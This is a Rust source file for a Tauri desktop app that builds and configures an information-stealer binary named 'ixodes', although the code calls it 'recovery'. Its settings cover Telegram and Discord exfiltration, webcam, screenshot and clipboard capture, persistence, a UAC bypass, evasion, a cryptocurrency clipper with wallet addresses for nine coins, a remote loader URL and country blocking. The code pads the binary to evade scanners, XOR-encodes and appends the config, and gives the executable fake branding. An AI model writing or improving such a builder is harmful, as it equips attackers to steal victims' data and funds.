use image::GenericImageView;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};
use tauri::path::BaseDirectory;
use tauri::{AppHandle, Manager};

#[derive(Serialize)]
struct SettingsFile {
    name: String,
    path: String,
    is_default: bool,
}

#[derive(Serialize)]
struct BuildResult {
    success: bool,
    output: String,
    exe_path: Option<String>,
    moved_to: Option<String>,
}

#[derive(Debug, Deserialize)]
struct BrandingSettings {
    icon_source: Option<String>,
    icon_preset: Option<String>,
    product_name: Option<String>,
    file_description: Option<String>,
    company_name: Option<String>,
    product_version: Option<String>,
    file_version: Option<String>,
    copyright: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RecoverySettings {
    allowed_categories: Vec<String>,
    artifact_key: Option<String>,
    archive_password: Option<String>,
    telegram_token: Option<String>,
    telegram_chat_id: Option<String>,
    discord_webhook: Option<String>,
    capture_screenshots: Option<bool>,
    capture_webcams: Option<bool>,
    capture_clipboard: Option<bool>,
    persistence: Option<bool>,
    uac_bypass: Option<bool>,
    evasion: Option<bool>,
    clipper: Option<bool>,
    melt: Option<bool>,
    loader_url: Option<String>,
    btc_address: Option<String>,
    eth_address: Option<String>,
    ltc_address: Option<String>,
    xmr_address: Option<String>,
    doge_address: Option<String>,
    dash_address: Option<String>,
    sol_address: Option<String>,
    trx_address: Option<String>,
    ada_address: Option<String>,
    pump_size_mb: Option<u32>,
    blocked_countries: Option<Vec<String>>,
    custom_extensions: Option<Vec<String>>,
    custom_keywords: Option<Vec<String>>,
    proxy_server: Option<String>,
}

#[derive(Debug, Serialize)]
struct PayloadConfig {
    pub allowed_categories: Option<HashSet<String>>,
    pub artifact_key: Option<String>,
    pub capture_screenshots: Option<bool>,
    pub capture_webcams: Option<bool>,
    pub capture_clipboard: Option<bool>,
    pub persistence_enabled: Option<bool>,
    pub uac_bypass_enabled: Option<bool>,
    pub evasion_enabled: Option<bool>,
    pub clipper_enabled: Option<bool>,
    pub melt_enabled: Option<bool>,
    pub btc_address: Option<String>,
    pub eth_address: Option<String>,
    pub ltc_address: Option<String>,
    pub xmr_address: Option<String>,
    pub doge_address: Option<String>,
    pub dash_address: Option<String>,
    pub sol_address: Option<String>,
    pub trx_address: Option<String>,
    pub ada_address: Option<String>,
    pub telegram_token: Option<String>,
    pub telegram_chat_id: Option<String>,
    pub discord_webhook: Option<String>,
    pub loader_url: Option<String>,
    pub proxy_server: Option<String>,
    pub pump_size_mb: Option<u32>,
    pub blocked_countries: Option<HashSet<String>>,
    pub custom_extensions: Option<HashSet<String>>,
    pub custom_keywords: Option<HashSet<String>>,
}

#[derive(Debug, Deserialize)]
struct BuildRequest {
    settings: RecoverySettings,
    branding: Option<BrandingSettings>,
    output_dir: Option<String>,
}

fn ixodes_root() -> Result<PathBuf, String> {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let repo_root = manifest_dir
        .parent()
        .and_then(|parent| parent.parent())
        .ok_or("failed to locate repo root")?;
    Ok(repo_root.join("ixodes"))
}

fn recovery_dir(ixodes_root: &Path) -> PathBuf {
    ixodes_root.join("src").join("recovery")
}

fn defaults_path(ixodes_root: &Path) -> PathBuf {
    recovery_dir(ixodes_root).join("defaults.rs")
}

#[tauri::command]
fn list_settings_files() -> Result<Vec<SettingsFile>, String> {
    let ixodes_root = ixodes_root()?;
    let recovery_dir = recovery_dir(&ixodes_root);
    let default_settings = defaults_path(&ixodes_root);

    let entries =
        fs::read_dir(&recovery_dir).map_err(|err| format!("failed to read recovery dir: {err}"))?;

    let mut files: Vec<SettingsFile> = entries
        .filter_map(|entry| entry.ok())
        .filter_map(|entry| {
            let path = entry.path();
            if !path.is_file() {
                return None;
            }
            let file_name = path.file_name()?.to_string_lossy().to_string();
            if !file_name.ends_with(".rs") || (!file_name.contains("settings") && file_name != "defaults.rs") {
                return None;
            }
            let is_default = path == default_settings;
            Some(SettingsFile {
                name: file_name,
                path: path.to_string_lossy().to_string(),
                is_default,
            })
        })
        .collect();

    files.sort_by(|a, b| a.name.cmp(&b.name));
    if files.is_empty() {
        return Err("no settings files found in ixodes/src/recovery".into());
    }

    Ok(files)
}

#[tauri::command]
async fn build_ixodes(app: AppHandle, request: BuildRequest) -> Result<BuildResult, String> {
    tauri::async_runtime::spawn_blocking(move || build_ixodes_sync(app, request))
        .await
        .map_err(|err| format!("build task failed to join: {err}"))?
}

fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResult, String> {
    let ixodes_root = ixodes_root()?;
    
    // We no longer modify defaults.rs.
    // Instead, we build the "template" binary and patch it.

    let mut command = Command::new("cargo");
    command
        .arg("build")
        .arg("--release")
        .current_dir(&ixodes_root)
        // Pass necessary ENV vars that might be required for build.rs logic, if any.
        // Assuming password is still baked in? If possible, move to dynamic config too.
        // For now, keeping password as env var if it's used in build.rs for zip encryption.
        .env(
            "IXODES_PASSWORD",
            request.settings.archive_password.as_deref().unwrap_or(""),
        );

    if let Some(branding) = request.branding.as_ref() {
        apply_branding_env(&app, &mut command, branding)?;
    }

    let output = command
        .output()
        .map_err(|err| format!("failed to start cargo build: {err}"))?;

    let mut combined = String::new();
    combined.push_str(&String::from_utf8_lossy(&output.stdout));
    if !output.stderr.is_empty() {
        if !combined.ends_with('\n') {
            combined.push('\n');
        }
        combined.push_str(&String::from_utf8_lossy(&output.stderr));
    }

    if !output.status.success() {
        return Ok(BuildResult {
            success: false,
            output: combined.trim().to_string(),
            exe_path: None,
            moved_to: None,
        });
    }

    let exe_name = if cfg!(windows) {
        "ixodes.exe"
    } else {
        "ixodes"
    };
    let exe_path = ixodes_root.join("target").join("release").join(exe_name);
    if !exe_path.exists() {
        return Ok(BuildResult {
            success: false,
            output: format!(
                "{}\nexpected executable not found: {}",
                combined.trim(),
                exe_path.display()
            ),
            exe_path: None,
            moved_to: None,
        });
    }

    // 2. Read Compiled Binary
    let mut binary_data = fs::read(&exe_path)
        .map_err(|err| format!("failed to read template binary: {err}"))?;

    // 3. Pump Binary (if requested)
    if let Some(pump_mb) = request.settings.pump_size_mb {
        if pump_mb > 0 {
            pump_binary_data(&mut binary_data, pump_mb);
            combined = format!("{}\nInfo: binary pumped to {} MB", combined.trim(), pump_mb);
        }
    }

    // 4. Create Payload Config
    let config = PayloadConfig {
        allowed_categories: if request.settings.allowed_categories.is_empty() {
            None
        } else {
            Some(request.settings.allowed_categories.iter().cloned().collect())
        },
        artifact_key: request.settings.artifact_key.clone(),
        capture_screenshots: request.settings.capture_screenshots,
        capture_webcams: request.settings.capture_webcams,
        capture_clipboard: request.settings.capture_clipboard,
        persistence_enabled: request.settings.persistence,
        uac_bypass_enabled: request.settings.uac_bypass,
        evasion_enabled: request.settings.evasion,
        clipper_enabled: request.settings.clipper,
        melt_enabled: request.settings.melt,
        btc_address: request.settings.btc_address.clone(),
        eth_address: request.settings.eth_address.clone(),
        ltc_address: request.settings.ltc_address.clone(),
        xmr_address: request.settings.xmr_address.clone(),
        doge_address: request.settings.doge_address.clone(),
        dash_address: request.settings.dash_address.clone(),
        sol_address: request.settings.sol_address.clone(),
        trx_address: request.settings.trx_address.clone(),
        ada_address: request.settings.ada_address.clone(),
        telegram_token: request.settings.telegram_token.clone(),
        telegram_chat_id: request.settings.telegram_chat_id.clone(),
        discord_webhook: request.settings.discord_webhook.clone(),
        loader_url: request.settings.loader_url.clone(),
        proxy_server: request.settings.proxy_server.clone(),
        pump_size_mb: request.settings.pump_size_mb,
        blocked_countries: request.settings.blocked_countries.as_ref().map(|v| v.iter().cloned().collect()),
        custom_extensions: request.settings.custom_extensions.as_ref().map(|v| v.iter().cloned().collect()),
        custom_keywords: request.settings.custom_keywords.as_ref().map(|v| v.iter().cloned().collect()),
    };

    // 5. Serialize, Encrypt, and Append
    let config_json = serde_json::to_string(&config)
        .map_err(|err| format!("failed to serialize config: {err}"))?;
    
    let encrypted_config = xor_codec(config_json.as_bytes());

    let delimiter = "::IXODES_CONFIG::";
    binary_data.extend_from_slice(delimiter.as_bytes());
    binary_data.extend_from_slice(&encrypted_config);

    // 6. Write to Destination
    let moved_to = if let Some(output_dir) = request.output_dir.as_deref().map(str::trim) {
        if output_dir.is_empty() {
            None
        } else {
            let output_path = PathBuf::from(output_dir);
            if output_path.extension().is_some() {
                Some(output_path)
            } else {
                let _ = fs::create_dir_all(&output_path);
                Some(output_path.join(exe_name))
            }
        }
    } else {
        None
    };

    let moved_to = moved_to.unwrap_or_else(|| {
        std::env::var("USERPROFILE")
            .map(PathBuf::from)
            .or_else(|_| std::env::var("HOME").map(PathBuf::from))
            .map(|home| home.join("Desktop").join(exe_name))
            .unwrap_or_else(|_| PathBuf::from(exe_name))
    });

    // Write final patched binary
    fs::write(&moved_to, &binary_data)
        .map_err(|err| format!("failed to write final binary to {}: {}", moved_to.display(), err))?;

    Ok(BuildResult {
        success: true,
        output: combined.trim().to_string(),
        exe_path: Some(exe_path.to_string_lossy().to_string()),
        moved_to: Some(moved_to.to_string_lossy().to_string()),
    })
}

fn xor_codec(data: &[u8]) -> Vec<u8> {
    let key = b"9e2b4cb38d6890f845a7593430292211"; // Static 32-byte key
    let mut output = data.to_vec();
    for (i, byte) in output.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
    output
}

fn apply_branding_env(
    app: &AppHandle,
    command: &mut Command,
    branding: &BrandingSettings,
) -> Result<(), String> {
    let icon_path = resolve_icon_path(app, branding)?;
    if let Some(icon) = icon_path {
        command.env("IXODES_ICON_PATH", icon.to_string_lossy().to_string());
    }

    set_env_if_present(
        command,
        "IXODES_PRODUCT_NAME",
        branding.product_name.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_FILE_DESCRIPTION",
        branding.file_description.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_COMPANY_NAME",
        branding.company_name.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_PRODUCT_VERSION",
        branding.product_version.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_FILE_VERSION",
        branding.file_version.as_deref(),
    );
    set_env_if_present(command, "IXODES_COPYRIGHT", branding.copyright.as_deref());

    Ok(())
}

fn set_env_if_present(command: &mut Command, key: &str, value: Option<&str>) {
    if let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) {
        command.env(key, value);
    }
}

fn pump_binary_data(data: &mut Vec<u8>, target_mb: u32) {
    use rand::Rng;
    
    let target_size = (target_mb as u64) * 1024 * 1024;
    let current_size = data.len() as u64;

    if current_size >= target_size {
        return;
    }

    let needed = (target_size - current_size) as usize;
    let mut rng = rand::thread_rng();
    let mut buffer = vec![0u8; needed];

    // Simple randomization
    rng.fill(&mut buffer[..]);
    
    data.extend_from_slice(&buffer);
}

fn resolve_icon_path(
    app: &AppHandle,
    branding: &BrandingSettings,
) -> Result<Option<PathBuf>, String> {
    if let Some(source) = branding
        .icon_source
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
    {
        if source.starts_with("http://") || source.starts_with("https://") {
            let bytes = download_icon(source)?;
            let normalized = normalize_icon_from_bytes(&bytes, target_icon_ext())?;
            return Ok(Some(normalized));
        }

        let path = PathBuf::from(source);
        if path.is_dir() {
            if let Some(candidate) = select_icon_from_dir(&path) {
                let normalized = normalize_icon_from_path(&candidate, target_icon_ext())?;
                return Ok(Some(normalized));
            }
            return Ok(None);
        }
        if path.is_file() {
            let normalized = normalize_icon_from_path(&path, target_icon_ext())?;
            return Ok(Some(normalized));
        }
        return Err(format!("icon path not found: {source}"));
    }

    if let Some(preset) = branding
        .icon_preset
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
    {
        if preset == "none" {
            return Ok(None);
        }

        if preset == "tauri-default" {
            let base = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
            let icon_path = if cfg!(windows) {
                base.join("icons").join("icon.ico")
            } else if cfg!(target_os = "macos") {
                base.join("icons").join("icon.icns")
            } else {
                base.join("icons").join("icon.png")
            };
            if icon_path.exists() {
                let normalized = normalize_icon_from_path(&icon_path, target_icon_ext())?;
                return Ok(Some(normalized));
            }
            return Err("tauri default icon not found".into());
        }

        let preset_path = resolve_preset_icon(app, preset)?;
        let normalized = normalize_icon_from_path(&preset_path, target_icon_ext())?;
        return Ok(Some(normalized));
    }

    Ok(None)
}

fn select_icon_from_dir(dir: &Path) -> Option<PathBuf> {
    let candidates = if cfg!(windows) {
        ["icon.ico", "app.ico", "ixodes.ico"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    } else if cfg!(target_os = "macos") {
        ["icon.icns", "app.icns", "ixodes.icns"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    } else {
        ["icon.png", "app.png", "ixodes.png"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    };

    for candidate in candidates {
        if candidate.exists() {
            return Some(candidate);
        }
    }
    None
}

fn download_icon(url: &str) -> Result<Vec<u8>, String> {
    let response =
        reqwest::blocking::get(url).map_err(|err| format!("failed to download icon: {err}"))?;
    if !response.status().is_success() {
        return Err(format!("icon download failed ({})", response.status()));
    }
    let content_type = response
        .headers()
        .get(reqwest::header::CONTENT_TYPE)
        .and_then(|value| value.to_str().ok())
        .map(|value| value.to_string());
    let bytes = response
        .bytes()
        .map_err(|err| format!("failed to read icon response: {err}"))?;

    let _ = icon_extension_from_url(url).or_else(|| {
        content_type
            .as_deref()
            .and_then(icon_extension_from_content_type)
    });

    Ok(bytes.to_vec())
}

fn resolve_preset_icon(app: &AppHandle, preset: &str) -> Result<PathBuf, String> {
    let exts: &[&str] = if cfg!(windows) {
        &["ico", "png"]
    } else {
        &["png"]
    };

    for ext in exts {
        let rel = Path::new("presets").join(format!("{preset}.{ext}"));
        if let Ok(path) = app.path().resolve(&rel, BaseDirectory::Resource) {
            if path.exists() {
                return Ok(path);
            }
        }

        let dev_path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(&rel);
        if dev_path.exists() {
            return Ok(dev_path);
        }
    }

    Err(format!(
        "preset icon not found: presets/{}.(ico|png)",
        preset
    ))
}

fn icon_extension_from_url(url: &str) -> Option<String> {
    let trimmed = url.split('?').next().unwrap_or(url);
    let ext = Path::new(trimmed)
        .extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| ext.to_ascii_lowercase())?;
    if ext == "ico" || ext == "icns" || ext == "png" {
        Some(ext)
    } else {
        None
    }
}

fn icon_extension_from_content_type(content_type: &str) -> Option<String> {
    let content_type = content_type.to_ascii_lowercase();
    if content_type.contains("image/x-icon") || content_type.contains("image/vnd.microsoft.icon") {
        Some("ico".to_string())
    } else if content_type.contains("image/icns") {
        Some("icns".to_string())
    } else if content_type.contains("image/png") {
        Some("png".to_string())
    } else {
        None
    }
}

fn target_icon_ext() -> &'static str {
    if cfg!(windows) {
        "ico"
    } else {
        "png"
    }
}

fn normalize_icon_from_path(path: &Path, target_ext: &str) -> Result<PathBuf, String> {
    if let Some(ext) = path.extension().and_then(|ext| ext.to_str()) {
        if ext.eq_ignore_ascii_case("icns") {
            return Err("icns files are not supported yet; provide a 256-512px PNG instead".into());
        }
    }
    let bytes = fs::read(path).map_err(|err| format!("failed to read icon: {err}"))?;
    normalize_icon_from_bytes(&bytes, target_ext)
}

fn normalize_icon_from_bytes(bytes: &[u8], target_ext: &str) -> Result<PathBuf, String> {
    let image = image::load_from_memory(bytes)
        .map_err(|err| format!("failed to decode icon image: {err}"))?;
    let (width, height) = image.dimensions();

    if width != height {
        return Err("icon must be square (same width and height)".into());
    }
    if width < 256 || width > 512 {
        return Err("icon must be between 256x256 and 512x512".into());
    }

    let resized = if width == 256 {
        image
    } else {
        image.resize_exact(256, 256, image::imageops::FilterType::Lanczos3)
    };
    let rgba = resized.to_rgba8();

    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_millis())
        .unwrap_or(0);
    let file_name = format!("ixodes-icon-{timestamp}.{target_ext}");
    let path = std::env::temp_dir().join(file_name);

    if target_ext == "ico" {
        let icon = ico::IconImage::from_rgba_data(256, 256, rgba.into_raw());
        let mut dir = ico::IconDir::new(ico::ResourceType::Icon);
        dir.add_entry(ico::IconDirEntry::encode(&icon).map_err(|err| err.to_string())?);
        let mut file =
            fs::File::create(&path).map_err(|err| format!("failed to write icon: {err}"))?;
        dir.write(&mut file)
            .map_err(|err| format!("failed to write ico: {err}"))?;
    } else {
        rgba.save(&path)
            .map_err(|err| format!("failed to write icon: {err}"))?;
    }

    Ok(path)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .invoke_handler(tauri::generate_handler![list_settings_files, build_ixodes])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
